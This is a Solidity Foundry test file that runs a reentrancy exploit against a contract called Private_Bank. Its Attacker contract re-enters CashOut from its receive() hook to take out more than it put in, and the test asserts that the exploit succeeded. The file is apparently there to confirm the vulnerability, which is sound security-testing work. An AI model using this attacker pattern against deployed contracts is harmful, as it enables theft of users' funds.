
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Private_Bank} from "../src/Private_Bank.sol";
import {Log} from "../src/Private_Bank.sol";

contract TestReentrancyPrivate_Bank is Test {
    Private_Bank public _contractUnderTest;
    Attacker public _attacker;
    Log public _logContract;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new Private_Bank(address(_logContract));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 1 ether && attackVal < type(uint128).max);
        vm.assume(attackVal % 2 == 0);

        uint256 halfAttackVal = attackVal / 2;

        vm.deal(address(_contractUnderTest), attackVal);
        vm.deal(address(_attacker), attackVal);
        vm.deal(address(this), attackVal);

        _attacker.setupAttack{value: halfAttackVal}(halfAttackVal);
        _attacker.attack(halfAttackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Private_Bank public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedWithdrawAmount;

    constructor(address victimAddress) { 
        _victim = Private_Bank(victimAddress);
    }

    function setupAttack(uint256 depositAmount) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        _victim.Deposit{value: depositAmount}();
        storedWithdrawAmount = depositAmount;
    }

    function attack(uint256 withdrawAmount) public {
        initialSnapshot = address(this).balance;
        _victim.CashOut(withdrawAmount);

        if (attackCallCount > 1 && address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            _victim.CashOut(storedWithdrawAmount);
        }
    }
}
